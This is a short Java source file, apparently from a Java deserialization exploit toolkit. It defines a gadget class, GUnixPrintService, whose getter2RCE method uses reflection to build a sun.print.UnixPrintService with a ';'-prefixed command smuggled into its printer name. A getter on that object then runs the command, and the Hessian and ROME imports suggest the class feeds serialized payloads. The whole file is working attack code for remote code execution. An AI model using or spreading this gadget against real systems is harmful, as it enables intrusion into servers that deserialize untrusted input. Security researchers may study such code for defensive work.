package xyz.eki.marshalexp.gadget.jdk;

import com.caucho.hessian.io.Hessian2Output;
import com.rometools.rome.feed.impl.ObjectBean;
import sun.print.UnixPrintService;
import xyz.eki.marshalexp.utils.ReflectUtils;

import java.lang.reflect.Constructor;
import java.util.Base64;
import java.util.HashMap;

public class GUnixPrintService {
    public static UnixPrintService getter2RCE(String cmd) throws Exception{
        Constructor<?> constructor = ReflectUtils.getFirstCtor(UnixPrintService.class);
        constructor.setAccessible(true);
        return (UnixPrintService) constructor.newInstance(";"+cmd);
    }
}
